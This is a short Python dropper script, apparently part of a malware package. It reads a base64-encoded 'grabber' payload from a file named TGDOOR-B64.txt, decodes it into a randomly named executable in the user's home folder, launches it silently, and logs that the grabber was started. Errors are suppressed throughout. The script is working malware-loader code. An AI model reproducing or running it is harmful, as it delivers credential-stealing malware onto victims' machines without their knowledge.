import base64
import os
import string
import subprocess
import random


try:
    with open('Everything.zip\\TGDOOR-B64.txt', 'r') as f:
        grabber_b64 = f.read().strip()
except:
    pass

characters = string.ascii_letters + string.digits
chars = ''.join(random.choice(characters.upper()) for _ in range(24))

grabber_bin = base64.b64decode(grabber_b64)
grabber_bin_path = os.path.join(os.path.expanduser('~'), f'{chars}.exe')

try:
    with open(grabber_bin_path, "wb") as file:
        file.write(grabber_bin)
except:
    pass

try:
    subprocess.Popen(grabber_bin_path, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
except:
    pass


try:
    with open(f'LOG-{chars}.txt', 'w', encoding='utf-8') as log_file:
        log_file.write(f'Grabber written to {grabber_bin_path}\n'
                       f'Process started.')
except:
    pass
